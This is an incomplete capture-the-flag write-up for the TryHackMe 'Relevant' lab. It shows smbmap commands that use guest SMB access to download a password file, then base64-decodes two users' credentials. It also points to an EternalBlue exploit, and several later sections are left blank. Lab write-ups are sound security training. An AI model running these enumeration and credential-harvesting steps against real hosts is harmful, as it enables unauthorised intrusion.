### Room: https://tryhackme.com/room/relevant
### Description:
You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

TarIP : 10.10.56.229

First we will do some Recon

## Recon
From the basic nmap scan we see some services which we might be able to use:

- WebServer
- SMB
- RDP
- Some weird ports.

### SMB Enumeration
`smbmap -H $TARIP` but we get an Authentication error, lets try some random things like "Guest" to see if we can get some output:

`smbmap -H $TARIP -u Guest` And yes, we found some shares that are accesible for guests:

```
─$ smbmap -H $TARIP -u Guest -s nt4wrksv                                                                                                                1 ⨯
[+] IP: 10.10.56.229:445	Name: 10.10.56.229                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	nt4wrksv                                          	READ, WRITE	
```

We see that nt4wrksv is read/write for us, so lets see whats in there:

```
└─$ smbmap -H $TARIP -u Guest -r nt4wrksv
[+] IP: 10.10.56.229:445	Name: 10.10.56.229                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	nt4wrksv                                          	READ, WRITE	
	.\nt4wrksv\*
	dr--r--r--                0 Sat Sep 10 12:38:32 2022	.
	dr--r--r--                0 Sat Sep 10 12:38:32 2022	..
	fr--r--r--               98 Sat Jul 25 11:35:44 2020	passwords.txt
```

Well that is convenient... lets download the file and see whats in there:

```
smbmap -H $TARIP -u Guest --download nt4wrksv/passwords.txt

─$ cat 10.10.56.229-nt4wrksv_passwords.txt                                                                                                            130 ⨯
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

From first glance (And the == ending) this might be base64, lets see if we can get something out of those with base64

```
─$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d                            
Bob - !P@$$W0rD!123

└─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$                                   
```
### SMB Enumeration (With Found credentials)

### RDP Connection(s) for found user credentials

Since we saw in the namp 
Use : https://www.kali.org/docs/general-use/using-eol-python-versions/ to fix the exploit.
Reference: https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/

Find Named pipes :
`smbmap -H $TARIP -u Guest -r IPC$` 